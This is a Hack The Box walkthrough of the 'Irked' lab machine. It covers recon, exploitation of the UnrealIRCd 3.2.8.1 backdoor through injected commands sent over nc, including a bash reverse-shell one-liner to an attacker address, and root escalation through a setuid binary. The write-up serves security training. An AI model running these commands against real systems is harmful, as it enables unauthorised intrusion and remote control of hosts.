# Irked Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

### Nmap:

``nmap -p- -sV -oA fullirked 10.10.10.117``

### PORT      STATE SERVICE VERSION

> 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
> 
> 80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
> 
> 111/tcp   open  rpcbind 2-4 (RPC #100000)
> 
> 6697/tcp  open  irc     UnrealIRCd
> 
> 8067/tcp  open  irc     UnrealIRCd
> 
> 34714/tcp open  status  1 (RPC #100024)
> 
> 65534/tcp open  irc     UnrealIRCd

# ${{\color{purple}Initial Foothold}}\ $


### - ``gobuster dns -d irked.htb -t 25 -w /opt/seclists/Discovery/DNS/subdomains-top1million-20000.txt``
### - ``curl http://10.10.10.117/irked.jpg -o irked.jpg``
### - ``exiftool irked.jpg`` modification Date/Time : 2018
### - IRC is almost working !
### - ``vi /etc/hosts irked.htb``


# ${{\color{purple}Exploitation}}\ $

- Google RFC IRC to find out how to chat with the service.
> Watch the Connections Registration section 

``nc -nvvvv 10.10.10.117 6697``

``PASS blabla``

``NICK blabla``

``USER blabla blabla comment :haha``

![irked2](https://user-images.githubusercontent.com/123066149/218293454-a38c0587-14e4-4e81-a2da-50810f96a917.PNG)

There is a backdor on UnrealIRCd 3.2.8.1 I test it with my hands :

`` tcpdump -i tun0 icmp ``

`` echo "AB; ping -c 1 10.10.X.X" | nc 10.10.10.117 6697``

![image](https://user-images.githubusercontent.com/123066149/218293806-b39334d6-eef7-440d-ac51-dfeea706df36.png)

``searchsploit UnrealIRCd 3.2.8.1``

### I had tested the exploit in perl and it didn't work

### So I looked for a poc of the metasploit exploit 

- Google UnrealIRCd 3.2.8.1 - Backdoor Command Execution poc github

``python exploit.py -payload python 10.10.10.117 6697``

### or 

``echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.X.X/444 0>&1'" | nc 10.10.10.117 6697``


# ${{\color{purple}Privilege Escalation}}\ $

``cat .bash history | less``

``LinEnum.sh``

### I found a password in a file to extract data from an image 

``steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSssh``

![image](https://user-images.githubusercontent.com/123066149/218293960-9fbf5461-e560-4468-9b03-0201e93a4093.png)

![image](https://user-images.githubusercontent.com/123066149/218293966-b015a4ab-b57c-4749-92b9-11b3c7b70899.png)

### This was the password of user djmardov

![image](https://user-images.githubusercontent.com/123066149/218294030-6e7f4925-fd3b-415c-b2f0-96852ca4fe0e.png)

### There is a setuid binary that I am not used to see : viewusers

``base64 -w0 /usr/bin/viewuser``

![image](https://user-images.githubusercontent.com/123066149/218294127-8d50efda-8dfb-491a-8143-28f15e49722f.png)

### Kali machine 

``ltrace ./viewuser``

![irked3](https://user-images.githubusercontent.com/123066149/218294249-fc72f797-8706-4145-abba-b7ce18ce0b83.PNG)

``#! /bin/bash``

``echo "Sending a ROOT SHELL"``

``/bin/bash``

![image](https://user-images.githubusercontent.com/123066149/218294291-91d0b3a8-9aa2-48e1-96f0-18c464ba9c4d.png)

![irked5](https://user-images.githubusercontent.com/123066149/218294529-a6e3881f-0928-42d4-a5b4-a662a83391b2.PNG)

# ${{\color{purple}Points of Improvement}}\ $

* Use the protocol RFC if I don't know how to use it 

















